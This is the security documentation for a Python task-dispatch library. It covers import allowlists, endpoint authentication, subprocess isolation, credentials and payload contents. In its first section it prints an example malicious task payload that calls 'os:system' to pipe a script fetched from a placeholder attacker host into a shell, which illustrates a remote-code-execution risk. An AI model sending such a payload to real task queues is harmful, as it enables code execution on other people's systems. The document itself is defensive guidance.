# Security

Taskferry moves function names and JSON payloads between processes, and sometimes
across a network. That makes three things worth being explicit about.

## 1. Resolving a task name is an import

A remote task is identified by a name — `package.module:function` — and running it
means importing that module and calling that attribute. If names can arrive from
somewhere you do not control, an unrestricted resolver is a remote-code-execution
primitive:

```json
{"taskferry": "2", "task": "os:system", "args": ["curl evil.sh | sh"]}
```

`FunctionRegistry` therefore supports two controls, and production deployments
should use at least one.

**An import allowlist** — dynamic import is permitted only from named packages:

```python
from taskferry import FunctionRegistry

registry = FunctionRegistry(allowed_modules=["myapp.tasks", "myapp.jobs"])
```

**Explicit registration only** — nothing is imported that was not registered:

```python
registry = FunctionRegistry(allow_import=False)
registry.register(send_email)
registry.register(reindex, name="myapp:reindex")
```

Both are passed to whatever executes the work:

```python
# Procrastinate worker
register_dispatcher(app, registry=registry)

# Cloud Tasks receiver
handle_request(body, headers, registry=registry)

# The runtime itself
Taskferry(config=config, registry=registry)
```

Or through configuration, which reaches the runtime's own registry:

```python
TASKFERRY = {
    "backends": {...},
    "allowed_modules": ["myapp"],
}
```

The default (`allow_import=True`, no allowlist) is convenient for development and
is the wrong choice for a queue that anything untrusted can write to.

### Why not just pickle a callable?

Because unpickling attacker-controlled bytes is arbitrary code execution with no
allowlist available at all, and because a pickled payload ties the producer and
consumer to one interpreter version. Taskferry never pickles. See
[ADR-0009](adr/0009-serialization.md).

## 2. Push endpoints are yours to authenticate

`taskferry-cloudtasks` receives work over HTTP. `handle_request` takes bytes and
headers, deliberately — it never sees your framework's request object, which is
what makes one adapter serve Django, FastAPI, Flask and anything else.

The consequence is that **Taskferry cannot authenticate the request for you**.
Anyone who discovers the URL can POST to it.

Use the platform:

```python
# Cloud Run + Cloud Tasks: require an OIDC token from the queue's service account
from google.oauth2 import id_token
from google.auth.transport import requests as google_requests


def taskferry_execute(request):
    token = request.headers.get("Authorization", "").removeprefix("Bearer ")
    claims = id_token.verify_oauth2_token(
        token, google_requests.Request(), audience=EXPECTED_AUDIENCE
    )
    if claims.get("email") != EXPECTED_SERVICE_ACCOUNT:
        return HttpResponse(status=403)

    handle_request(request.body, dict(request.headers), registry=REGISTRY)
    return HttpResponse(status=204)
```

Configure the queue to send one:

```python
{"factory": "cloudtasks", "service_account_email": "runner@p.iam.gserviceaccount.com", ...}
```

Alternatively, keep the service private (Cloud Run "invoker" IAM, a VPC, an
internal load balancer) so only the queue can reach it at all.

Combine this with the allowlist from §1. The two are independent: authentication
answers "should this caller reach me", the allowlist answers "what may this
payload ask me to run".

## 3. Subprocess execution

`SubprocessJobBackend` runs `JobSpec.argv` with `shell=False` and an argv list, so
a job name or an argument can never become shell metacharacters. There is no
string interpolation into a command line anywhere in Taskferry.

What it does **not** do is sandbox. A local job runs with the parent's privileges
and, by default, its environment. If job specs can come from an untrusted source,
route them at a container runtime with real isolation
(`taskferry-cloudrun`, `taskferry-jobs[kubernetes]`) rather than at the local
backend, and set `inherit_env=False` so the child gets only what you gave it:

```python
{"factory": "subprocess", "inherit_env": False}
```

## Credentials

Taskferry never handles credentials. Every adapter uses its provider's own default
credential chain — Application Default Credentials on GCP, the boto3 chain on AWS,
`DefaultAzureCredential` on Azure, in-cluster ServiceAccount on Kubernetes. There
is no Taskferry setting for a secret key, and there should never be one. See
[ADR-0008](adr/0008-provider-credentials.md).

Provider clients are injectable, which is how the test suite runs with no accounts
and no credentials anywhere.

## Payload contents

Task arguments are JSON and are stored by the engine — in a PostgreSQL table, in a
Cloud Tasks queue, in a log line. Treat them as readable by anyone with access to
your infrastructure.

Pass identifiers, not secrets and not personal data:

```python
runtime.tasks.submit("myapp.tasks:send_invoice", invoice_id)  # yes
runtime.tasks.submit("myapp.tasks:send_invoice", card_number)  # no
```

This is also the rule that keeps payloads small and tasks idempotent, so it is
worth following even where confidentiality is not a concern.

## Reporting a vulnerability

Open a security advisory on the repository rather than a public issue.
